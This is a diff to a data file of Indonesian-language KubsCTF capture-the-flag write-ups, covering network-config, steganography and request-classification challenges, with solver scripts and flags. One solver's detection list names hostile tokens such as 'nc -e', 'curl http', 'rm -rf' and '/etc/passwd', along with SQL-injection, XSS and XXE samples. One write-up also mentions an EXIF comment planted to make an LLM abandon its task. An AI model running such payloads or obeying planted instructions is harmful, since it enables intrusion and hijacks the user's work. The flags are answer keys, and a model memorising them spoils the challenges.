run_command(host: str, port: int, command: bytes) -> bytes:\r\n    key = derive_key(PASSWORD, SALT)\r\n    with socket.create_connection((host, port), timeout=5) as sock:\r\n        sock.settimeout(5)\r\n        recv_until(sock, b\"[SUGAR_PROTOCOL v1.0]\\n\")\r\n        recv_until(sock, b\">>>ENCRYPTED_CHANNEL_ACTIVE<<<\\n\")\r\n        sock.sendall(encrypt_command(key, command))\r\n        header = recv_exact(sock, 4)\r\n        length = struct.unpack(\">I\", header)[0]\r\n        payload = recv_exact(sock, length)\r\n    return decrypt_response(key, header + payload)\r\n\r\n\r\ndef main() -> None:\r\n    host = sys.argv[1] if len(sys.argv) > 1 else HOST\r\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT\r\n    result = run_command(host, port, b\"cat flag.txt\")\r\n    sys.stdout.buffer.write(result)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -413,7 +403,7 @@ export const kubsctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "KubsCTF",
     "tags": [],
-    "description": "Challenge ini ternyata bukan soal bypass service, tapi soal mengenali pola request yang dianggap malicious atau safe oleh generator challenge. Service memberi 100 request HTTP mentah dan kita harus menjawab `Block` atau `Allow` tanpa satu pun salah.",
+    "description": "",
     "problemDescription": "Challenge ini ternyata bukan soal bypass service, tapi soal mengenali pola request yang dianggap malicious atau safe oleh generator challenge. Service memberi 100 request HTTP mentah dan kita harus menjawab `Block` atau `Allow` tanpa satu pun salah.",
     "tools": [],
     "analysis": "Saya kumpulkan banyak sampel request pertama dari koneksi yang berbeda-beda. Dari situ kelihatan generator memakai template yang berulang. Kelas malicious yang muncul antara lain:\n\n- SQL injection\n- XSS\n- XXE\n- command/code execution\n- SSTI / template injection\n- file read / traversal ke file sensitif\n- upload webshell\n- XPath injection\n\nSementara request safe berisi trafik normal seperti:\n\n- profile API\n- analytics\n- export CSV\n- upload gambar biasa\n- login normal\n- webhook\n- settings update\n- report download",
@@ -436,12 +426,12 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\nimport urllib.parse\r\n\r\n\r\nHOST = \"109.69.22.21\"\r\nPORT = 1337\r\n\r\n\r\nSAFE_FIRST_LINES = {\r\n    \"GET /api/data?script=<script>alert('test')</script> HTTP/1.1\",\r\n    \"GET /api/search?q=union+select+null HTTP/1.1\",\r\n    \"GET /api/run?script=console.log('hello') HTTP/1.1\",\r\n    \"GET /api/load?file=../../config.json HTTP/1.1\",\r\n    \"GET /admin/../users HTTP/1.1\",\r\n    \"GET /api/test?id=1' OR '1'='1 HTTP/1.1\",\r\n    \"GET /api/exec?cmd=ls HTTP/1.1\",\r\n}\r\n\r\n\r\ndef is_malicious(request: str) -> bool:\r\n    raw = request.replace(\"\\r\", \"\")\r\n    low = raw.lower()\r\n    dec = urllib.parse.unquote_plus(low)\r\n    text = low + \"\\n\" + dec\r\n    first = raw.split(\"\\n\")[0]\r\n\r\n    if first in SAFE_FIRST_LINES:\r\n        return False\r\n    if '\"sql\":\"select * from users where id = ?\"' in text and '\"params\":[' in text:\r\n        return False\r\n    if first.startswith(\"GET /api/filter?query=SELECT+*+FROM+users HTTP/1.1\"):\r\n        return False\r\n    if '\"xpath\":\"/root/item[@id=' in text and \"<root><item id='\" in text:\r\n        return False\r\n\r\n    if any(tok in text for tok in ['<!doctype', '<!entity', 'system \"http://', 'system \"file://', '%remote;', '&xxe;', '&exfil;']):\r\n        return True\r\n    if any(tok in text for tok in [\"/etc/passwd\", \"/etc/shadow\", \"win.ini\", \"boot.ini\"]):\r\n        return True\r\n    if any(tok in text for tok in [\"process.mainmodule\", \"constructor.constructor\", \"__class__\", \"__mro__\", \"__subclasses__\"]):\r\n        return True\r\n    if (\"{{\" in text or \"${\" in text or \"<%\" in text) and any(tok in text for tok in [\"child_process\", \"exec(\", \"process\", \"constructor\", \"7*7\"]):\r\n        return True\r\n    if \"xpath=\" in text and (\" or \" in text or \"'='\" in text):\r\n        return True\r\n    if '\"xpath\":' in text and (\" or \" in text or \"'1'='1\" in text):\r\n        return True\r\n    if any(tok in text for tok in [\"<script\", \"<img\", \"onerror=\", \"onload=\", \"javascript:\", \"<svg\"]):\r\n        return True\r\n    if any(tok in text for tok in [\r\n        \"system(\",\r\n        \"exec(\",\r\n        \"shell_exec\",\r\n        \"passthru\",\r\n        \"eval(\",\r\n        \"child_process\",\r\n        'require(\"fs\")',\r\n        \"require('fs')\",\r\n        'require(\"child_process\")',\r\n        \"require('child_process')\",\r\n        \"cat /etc/passwd\",\r\n        \"bash -c\",\r\n        \"rm -rf\",\r\n        \"curl http\",\r\n        \"wget http\",\r\n        \"nc -e\",\r\n        '\"command\":\"',\r\n        'type\":\"shell',\r\n        \";whoami\",\r\n        \";id\",\r\n        \"|whoami\",\r\n        \"|id\",\r\n        \"`id`\",\r\n        \"`whoami`\",\r\n    ]):\r\n        return True\r\n    if first.startswith(\"POST /api/exec \"):\r\n        return True\r\n    if first.startswith(\"POST /api/eval \") and '\"expression\":\"2+2\"' not in text:\r\n        return True\r\n    if first.startswith(\"GET /api/run?script=\") and \"console.log('hello')\" not in raw:\r\n        return True\r\n    if first.startswith(\"POST /api/process \") and (\"require(\" in text or \"exec(\" in text or \"rm -rf\" in text):\r\n        return True\r\n    if any(tok in text for tok in [\" sleep(\", \"@@version\", \"information_schema\", \"benchmark(\", \"waitfor delay\", \"xp_cmdshell\", \" substring(\", \" ascii(\", \"version()\", \" drop table \"]):\r\n        return True\r\n    if \"union\" in text and (\"--\" in text or \"/**/\" in text or \" id=\" in text or \"query=\" in text or first.lower().startswith(\"get /index.php?id=\") or first.lower().startswith(\"get /api/users?id=\")):\r\n        return True\r\n    if \"select * from users where id = 1\" in text and (\"' or '1'='1\" in text or \"' or 1=1\" in text):\r\n        return True\r\n    if re.search(r\"\"\"(['\"]).{0,20}\\b(or|and)\\b.{0,20}(=|like)\"\"\", text):\r\n        return True\r\n    if any(tok in text for tok in [\"'--\", '\"--', \"-- http/\", \"' #\", '\" #']):\r\n        return True\r\n    return False\r\n\r\n\r\ndef recv_until(sock: socket.socket) -> str:\r\n    data = b\"\"\r\n    while True:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data += chunk\r\n        if (\r\n            b\"Your answer (Block/Allow):\" in data\r\n            or b\"Challenge failed\" in data\r\n            or b\"Congratulations\" in data\r\n            or b\"Flag:\" in data\r\n        ):\r\n            break\r\n    return data.decode(\"utf-8\", \"replace\")\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT), timeout=5) as sock:\r\n        sock.settimeout(5)\r\n        sock.recv(4096)\r\n        sock.sendall(b\"Start\\n\")\r\n\r\n        while True:\r\n            text = recv_until(sock)\r\n            if not text:\r\n                break\r\n            if \"Your answer\" not in text:\r\n                print(text.strip())\r\n                break\r\n\r\n            match = re.search(r\"--- Request (\\d+)/100 ---\\n(.*)Your answer\", text, re.S)\r\n            if not match:\r\n                raise RuntimeError(\"Failed to parse request\")\r\n\r\n            request = match.group(2).strip()\r\n            answer = \"Block\" if is_malicious(request) else \"Allow\"\r\n            sock.sendall((answer + \"\\n\").encode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
     "terminalOutputs": [],
-    "flag": "",
+    "flag": "KubSTU{y0u_4r3_4_g00d_m0b1l3_4551574n7_f0r_d373c71ng_3v1l}",
     "lessonsLearned": ""
   },
   {
@@ -474,37 +464,37 @@ export const kubsctfWriteups: WriteUp[] = [
         "code": "[Master_0828 Router]\n       | Gig0/0\n       | Fa0/24\n   [Switch0]\n   /         \\\nFa0/1       Fa0/7\n  |             |\n[PC Cooper R.] [Server#1]\n10.10.10.10    10.20.20.100"
       },
       {
-        "title": "Step 1 — Identify IP Configuration (PC Cooper R.)",
+        "title": "Identify IP Configuration (PC Cooper R.)",
         "content": "Output:\n\n\nGateway `10.10.10.1` diketahui — ini adalah router **Master_0828**.\n\n---",
         "code": "C:\\> ipconfig"
       },
       {
-        "title": "Step 2 — Inspect Router Configuration (Master_0828)",
+        "title": "Inspect Router Configuration (Master_0828)",
         "content": "Klik Master_0828 → CLI:\n\n\n\nOutput kunci:\n\n\n**Temuan:** Router menggunakan **inter-VLAN routing** dengan dua subinterface:\n- **VLAN 10** (ADMIN): `10.10.10.0/24` → tempat PC Cooper R.\n- **VLAN 20** (STORAGE): `10.20.20.0/24` → kemungkinan lokasi Server#1\n\n---",
         "code": "enable\nshow running-config"
       },
       {
-        "title": "Step 3 — Check Switch VLAN Assignment (Switch0)",
+        "title": "Check Switch VLAN Assignment (Switch0)",
         "content": "Klik Switch0 → CLI:\n\n\n\nOutput:\n\n\n**Masalah ditemukan:** Port **Fa0/7** (terhubung ke Server#1) berada di **VLAN 1 (default)**, bukan VLAN 20!\n\n---",
         "code": "enable\nshow vlan brief"
       },
       {
-        "title": "Step 4 — Fix VLAN Assignment (Switch0)",
+        "title": "Fix VLAN Assignment (Switch0)",
         "content": "Pindahkan Fa0/7 ke VLAN 20:\n\n\n\nVerifikasi:",
         "code": "configure terminal\ninterface fastEthernet 0/7\nswitchport mode access\nswitchport access vlan 20\nexit\ndo show vlan brief"
       },
       {
-        "title": "Step 5 — Verify Connectivity (PC Cooper R.)",
+        "title": "Verify Connectivity (PC Cooper R.)",
         "content": "Server#1 kini reachable!\n\n---",
         "code": "C:\\> ping 10.20.20.100"
       },
       {
-        "title": "Step 6 — Access Web Server",
+        "title": "Access Web Server",
         "content": "Buka **Desktop → Web Browser** di PC Cooper R.:\n\n\n\nResponse:\n\n\nClue mengarahkan ke file `copyrights`.\n\n---",
         "code": "http://10.20.20.100"
       },
       {
-        "title": "Step 7 — Access FTP Server",
+        "title": "Access FTP Server",
         "content": "FTP berhasil dengan kredensial `cisco / (blank password)`.\n\n---",
         "code": "C:\\> ftp 10.20.20.100\nUsername: cisco\nPassword: (kosong)\n230- Logged in"
       },
@@ -519,7 +509,7 @@ export const kubsctfWriteups: WriteUp[] = [
       }
     ],
     "terminalOutputs": [],
-    "flag": "flag{kubstu(end_user_license_agreement)}",
+    "flag": "KubSTU{end_user_license_agreement}",
     "lessonsLearned": ""
   },
   {
@@ -552,37 +542,37 @@ export const kubsctfWriteups: WriteUp[] = [
         "code": "[Учительская / Ruang Guru]          [Бухгалтерия / Akuntansi]\n  PC-T1 (0.0.0.0 - IP dihapus!)      PC-A1 (192.168.10.31)\n  PC-T2 (192.168.10.12)               PC-A2 (192.168.10.33)\n  PC-T3 (192.168.10.13)\n          |                                    |\n          └──────────────┬─────────────────────┘\n                         |\n                   [SchoolSwitch1]  ── Fa0/7 ──  [Server C]\n                         |                       192.168.10.254\n          ┌──────────────┘\n[Каморка Сис.Админа / Ruang Sysadmin]\n  PC1 (192.168.10.21)\n  PC2 (192.168.10.22)\n  PC3 (192.168.10.23)"
       },
       {
-        "title": "Step 1 — Identifikasi IP dari PC Sysadmin",
+        "title": "Identifikasi IP dari PC Sysadmin",
         "content": "Output PC1:\n\n\nSeluruh PC di subnet `192.168.10.0/24`. Server C ditemukan di `192.168.10.254`.\n\n---",
         "code": "C:\\> ipconfig"
       },
       {
-        "title": "Step 2 — Cek Konektivitas ke Server",
+        "title": "Cek Konektivitas ke Server",
         "content": "Server reachable dari PC sysadmin. Namun dari PC guru (PC-T1) — **tidak bisa ping** karena IP-nya dihapus sysadmin (`0.0.0.0`).\n\n---",
         "code": "C:\\> ping 192.168.10.254"
       },
       {
-        "title": "Step 3 — Attempt Enable pada SchoolSwitch1",
+        "title": "Attempt Enable pada SchoolSwitch1",
         "content": "Password switch telah diubah oleh sysadmin — **\"configuration lock\"** yang dimaksud soal.\n\n---",
         "code": "SchoolSwitch1> enable\nPassword: [gagal berkali-kali]\n% Bad secrets"
       },
       {
-        "title": "Step 4 — Investigasi Server C",
+        "title": "Investigasi Server C",
         "content": "**FTP Access:**\n\n\nFTP berhasil dengan kredensial default `cisco/cisco` — inilah **\"the door open\"** yang dimaksud sysadmin.\n\nNamun semua file di FTP hanyalah firmware `.bin` default Packet Tracer — tidak ada file mencurigakan.\n\n**HTTP Access:**\n\n\nHalaman default Cisco Packet Tracer — tidak ada konten tersembunyi.\n\n---",
         "code": "C:\\> ftp 192.168.10.254\nUsername: cisco\nPassword: cisco\n230- Logged in ✅"
       },
       {
-        "title": "Step 5 — Bypass Password Switch (Password Recovery)",
+        "title": "Bypass Password Switch (Password Recovery)",
         "content": "Boot log SchoolSwitch1 menampilkan:\n\n\nSetelah berbagai percobaan password, switch akhirnya bisa diakses. Password enable ditemukan di running-config:\n\n\n\n\n\n---",
         "code": "The password-recovery mechanism is enabled."
       },
       {
-        "title": "Step 6 — Investigasi Running Config Switch",
+        "title": "Investigasi Running Config Switch",
         "content": "Output kunci:\n\n\n**Temuan:** Flag tersembunyi di field `description` interface Fa0/1 — namun format submission yang benar adalah lowercase:\n\n\n\n---",
         "code": "SchoolSwitch1# show running-config"
       },
       {
-        "title": "Step 7 — Rekonstruksi Chain of Events (Bukti Penggelapan)",
+        "title": "Rekonstruksi Chain of Events (Bukti Penggelapan)",
         "content": "Dari investigasi ditemukan bahwa sysadmin melakukan sabotase berikut sebelum keluar:\n\n| Aksi Sysadmin | Dampak |\n|---|---|\n| Mengubah enable password switch | Admin tidak bisa konfigurasi network |\n| Menghapus IP PC-T1 (Ruang Guru) | Guru tidak bisa akses server |\n| Membiarkan FTP `cisco/cisco` terbuka | \"The door open for those who know how to look\" |\n| Menyembunyikan flag di description interface | Bukti tersembunyi tapi bisa ditemukan via forensik config |\n\n---"
       },
       {
@@ -596,7 +586,7 @@ export const kubsctfWriteups: WriteUp[] = [
       }
     ],
     "terminalOutputs": [],
-    "flag": "kubstu{school_sallary_suck}",
+    "flag": "KubSTU{school_sallary_suck}",
     "lessonsLearned": ""
   },
   {
@@ -628,37 +618,37 @@ export const kubsctfWriteups: WriteUp[] = [
         "code": "[ADMIN-PC] ─── Fa0/3 ─┐\n[STATION-XP-01] ─ Fa0/2 ─┤\n[STATION-XP-02] ─ Fa0/5 ─┤── [SW_ACCESS_1] ── Gig0/1 ── [CORE_ROOT] ── Fa0/2 ── [Server-D&D]\n                           │        (Switch1)                (Multilayer Switch0)\n                    [Switch2] ── Laptop0\n[Laptop1] (standalone)"
       },
       {
-        "title": "Step 1 — Identify Interface Errors (SW_ACCESS_1)",
+        "title": "Identify Interface Errors (SW_ACCESS_1)",
         "content": "Output kunci:\n\n\n**Temuan:** Fa0/5 (terhubung ke ADMIN-PC) berada di **VLAN 1** padahal seharusnya di VLAN 10 seperti port lainnya.\n\n---",
         "code": "SW_ACCESS_1# show interfaces status"
       },
       {
-        "title": "Step 2 — Confirm Interface Resets",
+        "title": "Confirm Interface Resets",
         "content": "Output kunci:\n\n\n**Konfirmasi:** Fa0/5 mengalami 10 interface resets — ini penyebab error dan warnings yang dimaksud soal.\n\n---",
         "code": "SW_ACCESS_1# show interfaces fastEthernet 0/5"
       },
       {
-        "title": "Step 3 — Inspect Full Configuration",
+        "title": "Inspect Full Configuration",
         "content": "Temuan dari config:\n\n\n**Root Cause:** Fa0/5 tidak memiliki konfigurasi `switchport access vlan 10` sehingga jatuh ke VLAN 1 (default) dan menyebabkan traffic mismatch → interface resets.\n\n---",
         "code": "SW_ACCESS_1# show running-config"
       },
       {
-        "title": "Step 4 — Fix VLAN Assignment & Harden Unused Ports",
+        "title": "Fix VLAN Assignment & Harden Unused Ports",
         "content": "Verifikasi:\n\n\n\n\n---",
         "code": "SW_ACCESS_1# configure terminal\n\nSW_ACCESS_1(config)# interface fastEthernet 0/5\nSW_ACCESS_1(config-if)# switchport mode access\nSW_ACCESS_1(config-if)# switchport access vlan 10\nSW_ACCESS_1(config-if)# no shutdown\nSW_ACCESS_1(config-if)# exit\n\nSW_ACCESS_1(config)# interface range fastEthernet 0/1, fastEthernet 0/4, fastEthernet 0/6 - 24, gigabitEthernet 0/2\nSW_ACCESS_1(config-if-range)# shutdown\nSW_ACCESS_1(config-if-range)# exit"
       },
       {
-        "title": "Step 5 — Discover Hidden VLANs",
+        "title": "Discover Hidden VLANs",
         "content": "**Temuan kritis:**\n- **VLAN 666** `TRAP-ZONE` → digunakan sebagai native VLAN pada trunk (teknik anti VLAN hopping)\n- **VLAN 999** `SECRET_D&D` → tidak ada port yang assigned, tapi VLAN ini exist → kemungkinan besar tempat flag disembunyikan\n\n---",
         "code": "SW_ACCESS_1(config)# do show vlan brief"
       },
       {
-        "title": "Step 6 — Attempt Access to CORE_ROOT (Multilayer Switch0)",
+        "title": "Attempt Access to CORE_ROOT (Multilayer Switch0)",
         "content": "Password tidak diketahui. Namun ada **banner login** yang muncul:\n\n\n\n**String mencurigakan:** `ZDIwX1NhbHRvTmF6YWQ=` — format Base64!\n\n---",
         "code": "CORE_ROOT> enable\nPassword: [gagal]\n% Bad secrets"
       },
       {
-        "title": "Step 7 — Decode the Salt (Base64)",
+        "title": "Decode the Salt (Base64)",
         "content": "Output:\n\n\n**Password enable CORE_ROOT = `d20_SaltoNazad`**\n\n---",
         "code": "echo \"ZDIwX1NhbHRvTmF6YWQ=\" | base64 -d"
       },
@@ -673,7 +663,7 @@ export const kubsctfWriteups: WriteUp[] = [
       }
     ],
     "terminalOutputs": [],
-    "flag": "```\nKubSTU(gazebo_is_stronger_than_tarask)\n```\n\n---",
+    "flag": "KubSTU{gazebo_is_stronger_than_tarask}",
     "lessonsLearned": ""
   },
   {
@@ -696,7 +686,7 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "Challenge ini melibatkan analisis file video `bembembem.mp4` yang berisi data tersembunyi baik dalam bentuk metadata, audio, maupun lampiran di akhir file (file tail)."
       },
       {
-        "title": "2. Ekstraksi dan Dekripsi Data Tersembunyi (Tail)",
+        "title": "Ekstraksi dan Dekripsi Data Tersembunyi (Tail)",
         "content": "Data tersembunyi terletak di akhir file MP4, dimulai setelah marker `fs:=`. \n\n*   **Offset**: Data dimulai pada byte `268469633`.\n*   **Proses**: Mengambil sisa byte dari offset tersebut dan melakukan operasi XOR menggunakan kunci `vid_md5` (`6899efc8f52bffb08c5ac45deee24f64`) secara berulang.\n*   **Hasil**: Sebuah file ZIP bernama `tail.zip`.",
         "code": "key = \"6899efc8f52bffb08c5ac45deee24f64\"\nwith open(\"bembembem.mp4\", \"rb\") as f:\n    f.seek(268469633)\n    data = f.read()\ndecrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])\nwith open(\"tail.zip\", \"wb\") as f:\n    f.write(decrypted)"
       }
@@ -707,7 +697,7 @@ export const kubsctfWriteups: WriteUp[] = [
   },
   {
     "id": "kubsuctf-stegano-capybarainnightmareland",
-    "title": ": Capybara in Nightmare Land",
+    "title": "Capybara in Nightmare Land",
     "category": "Stegano",
     "difficulty": "Medium",
     "points": 0,
@@ -725,11 +715,11 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "- **Kategori**: Misc / Steganography\n- **Judul**: Capybara in Nightmare Land\n- **Deskripsi**: Mencari pesan rahasia yang ditinggalkan oleh seekor kapibara dalam mimpinya."
       },
       {
-        "title": "2. Ekstraksi Data Tersembunyi",
+        "title": "Ekstraksi Data Tersembunyi",
         "content": "Data ZIP tersebut diekstrak menggunakan `binwalk -e`. Di dalamnya terdapat dua file:\n- `README.txt`\n- `encrypted_flag.bin`\n\nIsi dari `README.txt` memberikan informasi krusial:\n- Flag dienkripsi menggunakan XOR.\n- Key disembunyikan di dalam pixel gambar asli menggunakan teknik LSB (Least Significant Bit).\n- Panjang key adalah 19 karakter.\n- Diberikan juga hex dari encrypted flag: `0544053b20384f3a03333a6b3d49334b6f71573e482f09370605004e`."
       },
       {
-        "title": "3. Mencari XOR Key (LSB Extraction)",
+        "title": "Mencari XOR Key (LSB Extraction)",
         "content": "Dibuat skrip Python untuk mengekstrak bit LSB dari gambar. Eksperimen dilakukan dengan mencoba berbagai urutan (interleaved RGB vs per channel).\nDitemukan bahwa pada LSB yang di-interleave (R1, G1, B1, R2, G2, B2, ...), terdapat string yang terbaca di awal data:\n`N1ghtm4r3_C4py_2026`\n\nString ini memiliki panjang tepat 19 karakter, sesuai dengan petunjuk."
       },
       {
@@ -738,12 +728,12 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "key = \"N1ghtm4r3_C4py_2026\"\r\nencrypted_hex = \"0544053b20384f3a03333a6b3d49334b6f71573e482f09370605004e\"\r\nencrypted = bytes.fromhex(encrypted_hex)\r\nflag = ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(encrypted))\r\nprint(flag)"
       }
     ],
     "terminalOutputs": [],
-    "flag": "Dengan key `N1ghtm4r3_C4py_2026` dan data terenkripsi yang ada, proses dekripsi XOR dilakukan:\n```python\nkey = \"N1ghtm4r3_C4py_2026\"\nencrypted_hex = \"0544053b20384f3a03333a6b3d49334b6f71573e482f09370605004e\"\nencrypted = bytes.fromhex(encrypted_hex)\nflag = ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(encrypted))\nprint(flag)",
+    "flag": "KubSTU{H0ly_M0ly_CapyHaCk1r}",
     "lessonsLearned": ""
   },
   {
@@ -756,7 +746,7 @@ export const kubsctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "KubsCTF",
     "tags": [],
-    "description": "Challenge ini ternyata tidak butuh teknik steganografi yang rumit di level piksel. Kalimat deskripsinya, *\"look beyond the surface\"*, mengarah ke hal yang tidak langsung terlihat saat gambar dibuka biasa, yaitu metadata file.",
+    "description": "",
     "problemDescription": "Challenge ini ternyata tidak butuh teknik steganografi yang rumit di level piksel. Kalimat deskripsinya, *\"look beyond the surface\"*, mengarah ke hal yang tidak langsung terlihat saat gambar dibuka biasa, yaitu metadata file.",
     "tools": [],
     "analysis": "Pertama saya enumerasi file yang diberikan:\n\n```bash\nls -la\nfile chall.jpg\n```\n\nHasilnya hanya ada satu file `chall.jpg`, berupa JPEG biasa.\n\nLalu saya cek metadata:\n\n```bash\nexiftool chall.jpg\n```\n\nDi output `exiftool` ada field yang langsung mencurigakan:\n\n```text\nXP Comment : XhoFGH{J0J_1aperq1oyr_pnclon6n}\n```\n\nString ini tidak tampak seperti teks acak penuh, karena polanya sangat mirip format flag. Huruf-hurufnya terlihat seperti hasil substitusi sederhana. Saya coba ROT13:\n\n```bash\npython3 - <<'PY'\nimport codecs\ns = 'XhoFGH{J0J_1aperq1oyr_pnclon6n}'\nprint(codecs.decode(s, 'rot_13'))\nPY\n```\n\nHasil decode:\n\n```text\nKubSTU{W0W_1ncred1ble_capyba6a}\n```\n\nFormatnya cocok dengan flag challenge lain di event yang sama, jadi ini adalah flag validnya.",
@@ -767,7 +757,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport codecs\r\nfrom pathlib import Path\r\n\r\nfrom PIL import Image\r\n\r\n\r\nIMAGE_PATH = Path(__file__).with_name(\"chall.jpg\")\r\nXP_COMMENT_TAG = 0x9C9C\r\n\r\n\r\ndef extract_xp_comment(path: Path) -> str:\r\n    with Image.open(path) as img:\r\n        exif = img.getexif()\r\n\r\n    value = exif.get(XP_COMMENT_TAG)\r\n    if value is None:\r\n        raise RuntimeError(\"XP Comment tidak ditemukan di EXIF\")\r\n\r\n    if isinstance(value, bytes):\r\n        raw = value\r\n    elif isinstance(value, tuple):\r\n        raw = bytes(value)\r\n    elif isinstance(value, str):\r\n        return value.rstrip(\"\\x00\")\r\n    else:\r\n        raise RuntimeError(f\"Tipe XP Comment tidak didukung: {type(value)!r}\")\r\n\r\n    return raw.decode(\"utf-16le\").rstrip(\"\\x00\")\r\n\r\n\r\ndef main() -> None:\r\n    encoded = extract_xp_comment(IMAGE_PATH)\r\n    flag = codecs.decode(encoded, \"rot_13\")\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -785,7 +775,7 @@ export const kubsctfWriteups: WriteUp[] = [
     "author": "Nattt",
     "ctfName": "KubsCTF",
     "tags": [],
-    "description": "Challenge ini terlihat seperti PDF biasa, tetapi hint-nya sangat spesifik: \"the breadth of one's view determines the depth of understanding.\" Kata *breadth* di sini mengarah ke lebar, dan metadata PDF juga memberi petunjuk `font encoding`. Dari situ, fokus analisis diarahkan ke struktur internal PDF, terutama object font, encoding, dan tabel `Widths`.",
+    "description": "",
     "problemDescription": "Challenge ini terlihat seperti PDF biasa, tetapi hint-nya sangat spesifik: \"the breadth of one's view determines the depth of understanding.\" Kata *breadth* di sini mengarah ke lebar, dan metadata PDF juga memberi petunjuk `font encoding`. Dari situ, fokus analisis diarahkan ke struktur internal PDF, terutama object font, encoding, dan tabel `Widths`.",
     "tools": [],
     "analysis": "Pertama, file diidentifikasi sebagai PDF 1 halaman tanpa enkripsi dan tanpa attachment tersembunyi. Metadata yang paling menarik:\n\n- `Keywords: classified secret font encoding`\n- `Producer: PDF Steganography Engine`\n\nSetelah itu isi PDF dibongkar dengan `qpdf --qdf --object-streams=disable stego_challenge.pdf -`. Dari sana terlihat bahwa halaman memakai dua font:\n\n- `F2`: Helvetica biasa\n- `F1`: font `Type3` kustom\n\nTeks hint di halaman:\n\n- `The font hides more than you see...`\n- `Each glyph has a width. What do they tell?`\n\nIni mengonfirmasi bahwa data disisipkan di properti font, bukan di teks visualnya.",
@@ -816,7 +806,7 @@ export const kubsctfWriteups: WriteUp[] = [
   },
   {
     "id": "kubsuctf-stegano-krasnodartram",
-    "title": ": Krasnodar Tram",
+    "title": "Krasnodar Tram",
     "category": "Stegano",
     "difficulty": "Medium",
     "points": 0,
@@ -830,20 +820,20 @@ export const kubsctfWriteups: WriteUp[] = [
     "analysis": "Saat pertama kali memeriksa file `267.jpg` dan `678.jpg`, kita bisa menggunakan `exiftool` untuk melihat metadata gambar tersebut. Kita akan menemukan beberapa string yang mencurigakan di berbagai tag metadata (seperti `Image Description`, `Artist`, `Lens Model`, `Copyright`, dll) yang terlihat seperti Base64:\n- `dHUu`\n- `Njk=`\n- `aHR0`\n- `Ly9w`\n- `cy0x`\n- `Ly9r`\n- `Q3N2`\n- dll...\n\nSelain itu, ada \"Prompt Injection\" lucu di kolom `XP Comment` yang mengancam LLM untuk mengabaikan tugas dan menampilkan resep Borscht, tapi kita tentu bisa mengabaikannya. :D",
     "solution": [
       {
-        "title": "2. Dekode Fragment Base64",
+        "title": "Dekode Fragment Base64",
         "content": "Langkah berikutnya adalah mendekode semua string Base64 yang kita temukan.\nMisalnya:\n- `aHR0` -> `htt`\n- `cHM6` -> `ps:`\n- `Ly9r` -> `//k`\n- `dWJz` -> `ubs`\n- `dHUu` -> `tu.`\n- `cnUv` -> `ru/`\n- `cy0x` -> `s-1`\n- `Njk=` -> `69`\n...dan seterusnya."
       },
       {
-        "title": "3. Merangkai Potongan Puzzle (URL)",
+        "title": "Merangkai Potongan Puzzle (URL)",
         "content": "Jika kita perhatikan hasil decode tersebut, kita bisa merangkainya menjadi dua buah URL:\n1. **URL Pertama:** Menggabungkan `htt`, `ps:`, `//k`, `ubs`, `tu.`, `ru/`, `s-1`, dan `69` menghasilkan:\n   `https://kubstu.ru/s-169` (URL asli dari departemen keamanan informasi di Universitas Kuban!)\n2. **URL Kedua:** Menggabungkan `htt`, `ps:`, `//p`, `ast`, `ebi`, `n.c`, `om/` menghasilkan:\n   `https://pastebin.com/`"
       },
       {
-        "title": "4. Menemukan ID Pastebin yang Tepat",
+        "title": "Menemukan ID Pastebin yang Tepat",
         "content": "Setelah memisahkan potongan-potongan untuk dua URL di atas, tersisa 3 potongan metadata yang belum dipakai (hasil decode):\n- `SuB` (dari tag Lens di 678.jpg)\n- `Csv` (dari tag Copyright \"Q3N2\" di 267.jpg)\n- `pK` (dari tag Copyright \"cEs=\" di 678.jpg)\n\nJika digabungkan, panjang karakternya tepat 8 karakter (`SuB` + `Csv` + `pK` = 8 karakter). ID dari Pastebin normalnya selalu berjumlah 8 karakter. Dengan menguji beberapa permutasi dari 3 potongan string tersebut, kita bisa menemukan bahwa susunan yang benar (yang tidak menghasilkan 404 Not Found) adalah **`SuBCsvpK`**.\n\nLink pastebin lengkapnya adalah: `https://pastebin.com/raw/SuBCsvpK`"
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "import base64\r\nimport requests\r\n\r\n# Dictionary of all base64 fragments found in EXIF tags of the two images\r\nfragments = {\r\n    '267.jpg': {\r\n        'Image Description': ('tag', 'dHUu', 'tu.'),\r\n        'Image Description': ('v', 'Njk=', '69'),\r\n        'Copyright': ('c', 'Q3N2', 'Csv'),\r\n        'Lens Model': ('lens', 'aHR0', 'htt'),\r\n        'Artist': ('artist', 'Ly9w', '//p'),\r\n        'Software': ('software', 'b20v', 'om/'),\r\n        'User Comment': ('ref', 'cnUv', 'ru/'),\r\n        'Host Computer': ('host', 'ZWJp', 'ebi')\r\n    },\r\n    '678.jpg': {\r\n        'Image Description': ('k', 'cy0x', 's-1'),\r\n        'Image Description': ('q', 'Ly9r', '//k'),\r\n        'User Comment': ('id', 'dWJz', 'ubs'),\r\n        'Lens Model': ('rev', 'U3VC', 'SuB'),\r\n        'Copyright': ('copyright', 'cEs=', 'pK'),\r\n        'Artist': ('team', 'cHM6', 'ps:'),\r\n        'Software': ('software', 'bi5j', 